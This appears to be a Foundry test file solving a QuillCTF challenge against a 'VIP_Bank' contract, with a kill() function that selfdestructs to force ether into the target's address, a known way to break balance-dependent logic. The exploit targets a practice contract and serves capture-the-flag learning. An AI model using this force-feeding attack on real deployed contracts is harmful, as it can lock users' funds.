import "../src/quillctf3.sol";
import "forge-std/Test.sol";


contract Quillctf3 is Test {
    VIP_Bank vip_bank = new VIP_Bank();

    function kill() public {
    selfdestruct(payable(address(vip_bank)));
    //selfdestruct(vip_bank);
    }
}
